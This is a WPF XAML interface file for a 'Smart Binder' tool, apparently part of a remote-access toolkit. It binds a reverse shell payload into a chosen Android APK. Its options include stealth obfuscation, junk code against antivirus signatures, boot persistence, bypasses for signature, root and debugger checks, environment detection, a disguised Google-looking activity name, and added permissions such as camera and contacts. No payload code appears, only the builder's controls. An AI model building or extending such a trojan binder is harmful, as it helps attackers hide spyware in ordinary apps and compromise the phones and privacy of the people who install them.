<Window x:Class="TcpServerApp.SmartBinderView"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
        mc:Ignorable="d" 
        Title="Smart Binder - الدمج الذكي"
        Height="780" Width="950"
        Background="#0A0A0F"
        WindowStartupLocation="CenterScreen"
        FlowDirection="RightToLeft">

    <Grid Background="#0F172A">
        <ScrollViewer HorizontalScrollBarVisibility="Disabled" VerticalScrollBarVisibility="Auto" Padding="0,0,10,0">
            <StackPanel MaxWidth="600" HorizontalAlignment="Stretch" Margin="0,10,0,20">
                <TextBlock Text="Smart Binder (الدمج الذكي)" FontSize="20" FontWeight="Bold" Foreground="#F8FAFC" Margin="0,0,0,20"/>
                
                <Border Background="#1E293B" CornerRadius="8" Padding="16" Margin="0,0,0,16">
                    <Grid>
                        <Grid.ColumnDefinitions>
                            <ColumnDefinition Width="Auto"/>
                            <ColumnDefinition Width="*"/>
                        </Grid.ColumnDefinitions>

                        <!-- App Icon Area (New) -->
                        <Border x:Name="brdTargetIcon" Grid.Column="0" Background="#0F172A" Width="64" Height="64" CornerRadius="8" BorderBrush="#334155" BorderThickness="1" Margin="0,0,16,0" Visibility="Collapsed">
                            <Image x:Name="imgTargetIcon" Stretch="Uniform" Margin="4"/>
                        </Border>

                        <StackPanel Grid.Column="1">
                            <TextBlock Text="1. التطبيق الهدف (Target APK)" Foreground="#94A3B8" Margin="0,0,0,8"/>
                            <DockPanel>
                                <Button Content="تصفح" Width="80" Margin="8,0,0,0" Click="BtnBrowseTarget_Click"/>
                                <TextBox x:Name="txtTargetApk" IsReadOnly="True" Background="#0F172A" Foreground="White" BorderBrush="#334155" Padding="6"/>
                            </DockPanel>
                        </StackPanel>
                    </Grid>
                </Border>

                <Border Background="#1E293B" CornerRadius="8" Padding="16" Margin="0,0,0,16">
                    <StackPanel>
                        <TextBlock Text="2. الحمولة (Payload)" Foreground="#94A3B8" Margin="0,0,0,8"/>
                        <RadioButton x:Name="rbGenerate" Content="توليد حمولة جديدة (Reverse Shell)" IsChecked="True" Foreground="White" Margin="0,0,0,8" Checked="RbPayload_Checked"/>
                        
                        <StackPanel x:Name="pnlGeneratePayload" Margin="0,0,0,12">
                            <Grid Margin="0,0,0,12">
                                <Grid.ColumnDefinitions>
                                    <ColumnDefinition Width="*"/>
                                    <ColumnDefinition Width="*"/>
                                    <ColumnDefinition Width="*"/>
                                </Grid.ColumnDefinitions>
                                <StackPanel Grid.Column="0" Margin="0,0,8,0">
                                    <TextBlock Text="Host (No-IP / IP)" Foreground="#64748B" FontSize="11" Margin="0,0,0,4"/>
                                    <TextBox x:Name="txtHost" Text="127.0.0.1" Background="#0F172A" Foreground="White" BorderThickness="0" Padding="6" />
                                </StackPanel>
                                <StackPanel Grid.Column="1" Margin="4,0,4,0">
                                    <TextBlock Text="Port" Foreground="#64748B" FontSize="11" Margin="0,0,0,4"/>
                                    <TextBox x:Name="txtPort" Text="4444" Background="#0F172A" Foreground="White" BorderThickness="0" Padding="6" />
                                </StackPanel>
                                <StackPanel Grid.Column="2" Margin="8,0,0,0">
                                    <TextBlock Text="Connection Key" Foreground="#64748B" FontSize="11" Margin="0,0,0,4"/>
                                    <TextBox x:Name="txtKey" Text="" Background="#0F172A" Foreground="White" BorderThickness="0" Padding="6" />
                                </StackPanel>
                            </Grid>
                            
                            <TextBlock Text="ميزات الحقن الذكي (Injection Features)" Foreground="#94A3B8" Margin="0,0,0,8"/>
                            <UniformGrid Columns="2">
                                <CheckBox x:Name="chkObfuscate" Content="Stealth Obfuscation" Foreground="#CBD5E1" Margin="0,4"/>
                                <CheckBox x:Name="chkJunkCode" Content="Inject Junk Code (Anti-Sig)" IsChecked="True" Foreground="#CBD5E1" Margin="0,4"/>
                                <CheckBox x:Name="chkResilience" Content="Payload Resilience (Watchdog)" Foreground="#CBD5E1" Margin="0,4"/>
                                <CheckBox x:Name="chkHiddenApi" Content="Hidden API Bridge (Reflection)" IsChecked="True" Foreground="#CBD5E1" Margin="0,4"/>
                            </UniformGrid>
                        </StackPanel>

                        <RadioButton x:Name="rbSelect" Content="اختيار ملف DEX/APK موجود" Foreground="White" Margin="0,0,0,8" Checked="RbPayload_Checked"/>
                        <DockPanel x:Name="pnlSelectPayload" Visibility="Collapsed" Margin="0,0,0,8">
                            <Button Content="تصفح" Width="80" Margin="8,0,0,0" Click="BtnBrowsePayload_Click"/>
                            <TextBox x:Name="txtPayloadPath" IsReadOnly="True" Background="#0F172A" Foreground="White" BorderBrush="#334155" Padding="6"/>
                        </DockPanel>
                    </StackPanel>
                </Border>

                <Border Background="#1E293B" CornerRadius="8" Padding="16" Margin="0,0,0,16">
                    <StackPanel>
                        <TextBlock Text="3. خيارات الحقن (Injection Method)" Foreground="#94A3B8" Margin="0,0,0,8"/>
                        <ComboBox SelectedIndex="0" Padding="6" Margin="0,0,0,8">
                            <ComboBoxItem Content="Multidex Injection (Recommended) - حقن متقدم"/>
                            <ComboBoxItem Content="Smali Hook (Main Activity) - حقن في النشاط الرئيسي"/>
                        </ComboBox>
                        <CheckBox x:Name="chkPersistence" Content="تفعيل الثبات (Inject Persistence/BootReceiver)" Foreground="#CBD5E1" Margin="0,4"/>
                    </StackPanel>
                </Border>

                <!-- 4. App Identity (optional) -->
                <Border Background="#1E293B" CornerRadius="8" Padding="16" Margin="0,0,0,16">
                    <StackPanel>
                        <TextBlock Text="4. هوية التطبيق (App Identity - اختياري)" Foreground="#94A3B8" Margin="0,0,0,8"/>
                        <Grid Margin="0,0,0,8">
                            <Grid.ColumnDefinitions>
                                <ColumnDefinition Width="*"/>
                                <ColumnDefinition Width="*"/>
                            </Grid.ColumnDefinitions>
                            <StackPanel Grid.Column="0" Margin="0,0,8,0">
                                <TextBlock Text="App Name" Foreground="#64748B" FontSize="11" Margin="0,0,0,4"/>
                                <TextBox x:Name="txtAppName" Background="#0F172A" Foreground="White" BorderThickness="0" Padding="6"/>
                            </StackPanel>
                            <StackPanel Grid.Column="1" Margin="8,0,0,0">
                                <TextBlock Text="Package Name" Foreground="#64748B" FontSize="11" Margin="0,0,0,4"/>
                                <TextBox x:Name="txtPackageName" Background="#0F172A" Foreground="White" BorderThickness="0" Padding="6"/>
                            </StackPanel>
                        </Grid>
                    </StackPanel>
                </Border>

                <!-- Expert Binding Options (New) -->
                <Border Background="#1E293B" CornerRadius="8" Padding="16" Margin="0,0,0,16">
                    <StackPanel>
                        <TextBlock Text="إعدادات دمج خبيرة (Expert Binding Options)" Foreground="#94A3B8" Margin="0,0,0,12"/>
                        
                        <Expander Header="تخطي الحماية (Security Bypass)" Foreground="#CBD5E1" Margin="0,0,0,4">
                            <StackPanel Margin="10,4">
                                <CheckBox x:Name="chkSigBypass" Content="تخطي فحص التوقيع (Signature Bypass)" Foreground="#64748B" Margin="0,2" IsChecked="True"/>
                                <CheckBox x:Name="chkRootBypass" Content="تخطي فحص الروت (Root Detection Bypass)" Foreground="#64748B" Margin="0,2"/>
                                <CheckBox x:Name="chkDebugBypass" Content="تخطي فحص التصحيح (Anti-Debug Bypass)" Foreground="#64748B" Margin="0,2" IsChecked="True"/>
                            </StackPanel>
                        </Expander>

                        <Expander Header="كشف البيئة (Environment Detection)" Foreground="#CBD5E1" Margin="0,0,0,4">
                            <StackPanel Margin="10,4">
                                <CheckBox x:Name="chkEmuDetect" Content="كشف المحاكيات (Emulator Detection)" Foreground="#64748B" Margin="0,2"/>
                                <CheckBox x:Name="chkVpnDetect" Content="كشف VPN/Proxy (VPN Detection)" Foreground="#64748B" Margin="0,2"/>
                                <CheckBox x:Name="chkInstallerDetect" Content="كشف مصدر التثبيت (Store Check)" Foreground="#64748B" Margin="0,2"/>
                            </StackPanel>
                        </Expander>

                        <Expander Header="معالجة الموارد (Resource Processing)" Foreground="#CBD5E1" Margin="0,0,0,4">
                            <StackPanel Margin="10,4">
                                <CheckBox x:Name="chkManifestObf" Content="تموية المانيفست (Manifest Obfuscation)" Foreground="#64748B" Margin="0,2"/>
                                <CheckBox x:Name="chkResourceShrink" Content="تقليص الموارد (Resource Shrinking)" Foreground="#64748B" Margin="0,2" IsChecked="True"/>
                                <TextBlock Text="اسم النشاط الرئيسي المموه" Foreground="#475569" FontSize="10" Margin="0,4,0,2"/>
                                <TextBox x:Name="txtFakeActivity" Text="com.google.android.gms.auth.Activity" Background="#0F172A" Foreground="White" BorderThickness="0" Padding="4"/>
                            </StackPanel>
                        </Expander>
                    </StackPanel>
                </Border>

                <!-- 5. Extra Permissions (optional) -->
                <Border Background="#1E293B" CornerRadius="8" Padding="16" Margin="0,0,0,16">
                    <StackPanel>
                        <TextBlock Text="5. صلاحيات إضافية (Extra Permissions - اختياري)" Foreground="#94A3B8" Margin="0,0,0,8"/>
                        <RadioButton x:Name="rbDefaultPerms" Content="استخدام صلاحيات التطبيق الافتراضية" IsChecked="True" Foreground="White" Margin="0,0,0,4" Checked="RbPerms_Checked"/>
                        <RadioButton x:Name="rbSpecifyPerms" Content="تحديد صلاحيات إضافية يدويًا" Foreground="White" Margin="0,0,0,8" Checked="RbPerms_Checked"/>
                        <TextBox x:Name="txtExtraPerms" Visibility="Collapsed"
                                 Background="#0F172A" Foreground="White" BorderThickness="0" Padding="6"
                                 MinHeight="60" TextWrapping="Wrap" AcceptsReturn="True"
                                 ToolTip="أدخل الصلاحيات مفصولة بفاصلة أو سطر جديد (مثال: CAMERA, READ_CONTACTS)"/>
                    </StackPanel>
                </Border>

                <Button Content="بدء عملية الدمج" Height="40" Background="#22C55E" Foreground="White" FontWeight="Bold" Click="BtnBind_Click" Margin="0,0,0,10"/>
                
                <TextBlock x:Name="txtStatus" Text="بانتظار الإدخال..." Foreground="#64748B" Margin="0,10" HorizontalAlignment="Center"/>
             </StackPanel>
        </ScrollViewer>
    </Grid>
</Window>